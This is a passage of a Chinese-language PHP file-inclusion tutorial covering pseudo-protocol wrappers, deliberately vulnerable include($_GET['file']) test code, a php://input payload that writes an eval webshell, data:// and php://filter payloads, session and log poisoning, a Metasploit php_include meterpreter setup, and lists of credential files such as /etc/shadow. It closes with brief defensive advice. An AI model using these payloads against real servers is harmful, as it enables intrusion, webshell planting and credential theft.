访问本地文件系统</li>\n<li>http:// — 访问 HTTP (s) 网址</li>\n<li>ftp:// — 访问 FTP (s) URLs</li>\n<li>php:// — 访问各个输入 / 输出流（I/O streams）</li>\n<li>zlib:// — 压缩流</li>\n<li>data:// — 数据（RFC 2397）</li>\n<li>glob:// — 查找匹配的文件路径模式</li>\n<li>phar:// — PHP 归档</li>\n<li>ssh2:// — Secure Shell 2</li>\n<li>rar:// — RAR</li>\n<li>ogg:// — 音频流</li>\n<li>expect:// — 处理交互式的流</li>\n</ul>\n<h2 id=\"php-输入输出流\"><a class=\"anchor\" href=\"#php-输入输出流\">#</a> php:// 输入输出流</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h2 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h2>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>\n<p><span class=\"label warning\">php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p>\n<p><span class=\"label success\">📣举例</span></p>\n<ol>\n<li><span class=\"label info\">php://stdin</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//open our file pointer to read from stdin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$line</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行读取</p>\n<ol start=\"2\">\n<li><span class=\"label info\">php://stdout</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$fd</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdout'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"这是一个测试\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image019.png\" alt=\"\" /><br />\n可以看到打开了一个文件指针进行写入</p>\n<ol start=\"3\">\n<li><span class=\"label info\">php://stderr</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$stderr</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'php://stderr'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$stderr</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"lalala\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行写入</p>\n<h2 id=\"phpinput\"><a class=\"anchor\" href=\"#phpinput\">#</a> php://input</h2>\n<p>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br />\n<span class=\"label warning\">注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</span></p>\n<h3 id=\"phpinput-读取post数据\"><a class=\"anchor\" href=\"#phpinput-读取post数据\">#</a> php://input （读取 POST 数据）</h3>\n<p>碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；</p>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 1.php文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 <code>http://192.168.199.130/1.php</code> burp 抓包，添加 post 数据。</p>\n<p><span class=\"label\">结果</span></p>\n<p><img data-src=\"image021.png\" alt=\"\" /></p>\n<h3 id=\"phpinput写马\"><a class=\"anchor\" href=\"#phpinput写马\">#</a> php://input 写马</h3>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。</p>\n<p>如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</p>\n<p><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> <br />\n<span class=\"lebal info\"> 图片</span></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p><span class=\"label info\">当 allow_url_include=Off 时是不行的</span></p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<h3 id=\"phpinput命令执行\"><a class=\"anchor\" href=\"#phpinput命令执行\">#</a> php://input 命令执行</h3>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；<br />\n<span class=\"lebal info\">图片</span></p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<h2 id=\"phpfilter本地磁盘文件进行读取\"><a class=\"anchor\" href=\"#phpfilter本地磁盘文件进行读取\">#</a> php://filter（本地磁盘文件进行读取）</h2>\n<p>元封装器，设计用于 &quot;数据流打开&quot; 时的 &quot;筛选过滤&quot; 应用，对本地磁盘文件进行读写。</p>\n<p>用法：<br />\n <code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code> <br />\n <code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  一样。</p>\n<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>\n<p>php://filter 参数</p>\n<table>\n    <tr>\n        <th>名称</th>\n        <th>描述</th>\n        <th>备注</th>\n    </tr>\n    <tr>\n        <td>resource=&lt;要过滤的数据流&gt;</td>\n        <td>指定了你要筛选过滤的数据流。</td>\n        <td>必选</td>\n    </tr>\n    <tr>\n        <td>read=&lt;读链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>write=&lt;写链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>&lt;；两个链的筛选列表&gt;</td>\n        <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n        <td>&nbsp;</td>\n    </tr>\n</table>\n<p>过滤器详解<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=\"> https://blog.csdn.net/ni9htmar3/article/details/69812306#t8</span></p>\n<h2 id=\"file伪协议读取文件内容\"><a class=\"anchor\" href=\"#file伪协议读取文件内容\">#</a> file:// 伪协议 (读取文件内容)</h2>\n<p>通过 file 协议可以访问本地文件系统，读取到文件的内容</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image025.png\" alt=\"\" /></p>\n<h2 id=\"data伪协议\"><a class=\"anchor\" href=\"#data伪协议\">#</a> data:// 伪协议</h2>\n<p>数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  <code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code></p>\n<p>data://（读取文件）<br />\n和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； <?php // 打印 \"I love PHP\" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>\n<p>注意：&lt;span style=&quot;color: rgb (121, 121, 121);&quot;&gt;&lt;?php phpinfo ();, 这类执行代码最后没有？&gt;&lt;/span &gt; 闭合；</p>\n<p>如果 php.ini 里的 allow_url_include=On（PHP &lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:  <code>http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<h2 id=\"phar伪协议\"><a class=\"anchor\" href=\"#phar伪协议\">#</a> phar:// 伪协议</h2>\n<p>这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br />\n用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。<br />\n注意： PHP &gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br />\n步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"zip伪协议\"><a class=\"anchor\" href=\"#zip伪协议\">#</a> zip:// 伪协议</h2>\n<p>zip 伪协议和 phar 协议类似，但是用法不一样。<br />\n用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。<br />\n条件： PHP &gt; =5.3.0，注意在 windows 下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"封装协议摘要\"><a class=\"anchor\" href=\"#封装协议摘要\">#</a> 封装协议摘要</h2>\n<table>\n    <tr>\n        <th>属性</th>\n        <th>支持</th>\n    </tr>\n    <tr>\n        <td>受限于 allow_url_include</td>\n        <td>仅 <em>php://input</em>、 <em>php://stdin</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>允许读取</td>\n        <td>仅 <em>php://stdin</em>、 <em>php://input</em>、 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许写入</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许追加</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>（等于写入）\n        </td>\n    </tr>\n    <tr>\n        <td>允许同时读写</td>\n        <td>仅 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>支持 stat()</td>\n        <td>仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>仅仅支持 stream_select()</td>\n        <td><em>php://stdin</em>、 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://fd</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n</table>\n<h1 id=\"文件包含姿势\"><a class=\"anchor\" href=\"#文件包含姿势\">#</a> 文件包含姿势</h1>\n<h2 id=\"文件包含session\"><a class=\"anchor\" href=\"#文件包含session\">#</a> 文件包含 session</h2>\n<p><span class=\"label info\">利用条件：</span></p>\n<p>session 的存储位置可以获取。</p>\n<ol>\n<li>通过 phpinfo 的信息可以获取到 session 的存储位置。</li>\n</ol>\n<p>通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>另一种只能猜测了<br />\n根据各版本的中间件猜测。</li>\n</ol>\n<p><span class=\"label info\">session 中的内容可以被控制，传入恶意代码。</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例代码</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$s</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">漏洞分析</span></p>\n<p>此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。</p>\n<p>当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p>session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到 666 已经存里面了</p>\n<p><span class=\"label info\">漏洞利用</span><br />\n通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。</p>\n<p>当访问 http://www.xxx.com/x.php?str=&lt;?php phpinfo ();?&gt; 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p><span class=\"label info\">结果</span></p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"文件包含日志\"><a class=\"anchor\" href=\"#文件包含日志\">#</a> 文件包含日志</h2>\n<p>利用条件：需要知道服务器日志的存储路径，且日志文件可读。</p>\n<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>\n<p><span class=\"label danger\">💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。</span></p>\n<p><span class=\"label info\">示例</span><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p><span class=\"label success\">✔️还可以在 User-Agent 里插入 payload</span></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><span class=\"label danger\">💔有的日志文件里不一定会显示 UA 信息</span><br />\n<span class=\"label info\">示例</span><br />\n<img data-src=\"image017.png\" alt=\"\" /><br />\n这是因为 Apache 配置</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详情见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWxmLWZlcnJ5LmdpdGh1Yi5pby8yMDIxLzAxLzIyL2FwYWNoZSVFOCVBRSVCRiVFOSU5NyVBRSVFNiU5NyVBNSVFNSVCRiU5NyVFOCVBRiVBNiVFOCVBNyVBMyVFMyU4MCU5MCVFOCVCRCVBQyVFMyU4MCU5MS8=\">https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/</span></p>\n<h2 id=\"msf-攻击模块\"><a class=\"anchor\" href=\"#msf-攻击模块\">#</a> MSF 攻击模块</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>举个例子</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/unix/webapp/php_include</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">192.168</span>.199.12</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> phpuri /index.php?file<span class=\"token operator\">=</span>xxLFIxx</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> path http://192.168.199.147/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload php/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvport <span class=\"token number\">8888</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit -z</pre></td></tr></table></figure><h1 id=\"常见的敏感信息路径\"><a class=\"anchor\" href=\"#常见的敏感信息路径\">#</a> 常见的敏感信息路径</h1>\n<h2 id=\"windows系统\"><a class=\"anchor\" href=\"#windows系统\">#</a> <span class=\"label info\">Windows 系统</span></h2>\n<p>c:\\boot.ini// 查看系统版本</p>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml// IIS 配置文件</p>\n<p>c:\\windows\\repair\\sam // 存储 Windows 系统初次安装的密码</p>\n<p>c:\\ProgramFiles\\mysql\\my.ini// MySQL 配置</p>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD// MySQL root 密码</p>\n<p>c:\\windows\\php.ini//php 配置信息</p>\n<h2 id=\"linuxunix系统\"><a class=\"anchor\" href=\"#linuxunix系统\">#</a> <span class=\"label info\">Linux/Unix 系统</span></h2>\n<p>/etc/passwd// 账户信息</p>\n<p>/etc/shadow// 账户密码文件</p>\n<p>/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件</p>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</p>\n<p>/usr/local/app/php5/lib/php.ini// PHP 相关配置</p>\n<p>/etc/httpd/conf/httpd.conf// Apache 配置文件</p>\n<p>/etc/my.conf//mysql 配置文件</p>\n<h2 id=\"日志默认路径\"><a class=\"anchor\" href=\"#日志默认路径\">#</a> <span class=\"label info\">日志默认路径</span></h2>\n<p>apache+Linux 日志默认路径</p>\n<p><code>/etc/httpd/logs/access_log</code></p>\n<p>或者</p>\n<p><code>/var/log/httpd/access log</code></p>\n<p>apache+win2003 日志默认路径</p>\n<p><code>D:/xampp/apache/logs/access.log</code></p>\n<p><code>D:/xampp/apache/logs/error.log</code></p>\n<p>IIS6.0+win2003 默认日志文件</p>\n<p><code>C:/WINDOWS/system32/Logfiles</code></p>\n<p>IIS7.0+win2003 默认日志文件</p>\n<p><code>%SystemDrive%/inetpub/logs/LogFiles</code></p>\n<p>nginx 日志文件在用户安装目录的 logs 目录下</p>\n<p>如安装目录为 /usr/local/nginx, 则日志目录就是在</p>\n<p><code>/usr/local/nginx/logs</code></p>\n<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>\n<p><code>/opt/nginx/logs/access.log</code></p>\n<p>web 中间件默认配置</p>\n<p>apache+linux 默认配置文件</p>\n<p><code>/etc/httpd/conf/httpd.conf</code></p>\n<p>或者</p>\n<p><code>index.php?page=/etc/init.d/httpd</code></p>\n<p>IIS6.0+win2003 配置文件</p>\n<p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p>\n<p>IIS7.0+WIN 配置文件</p>\n<p><code>C:/Windows/System32/inetsrv/config/application/Host.config</code></p>\n<h1 id=\"文件包含漏洞的防御\"><a class=\"anchor\" href=\"#文件包含漏洞的防御\">#</a> 文件包含漏洞的防御</h1>\n<ol>\n<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>\n<li>过滤.（点）/（反斜杠）\\（反斜杠）</li>\n<li>禁止服务器远程文件包含</li>\n</ol>\n<h1 id=\"参考\"><a 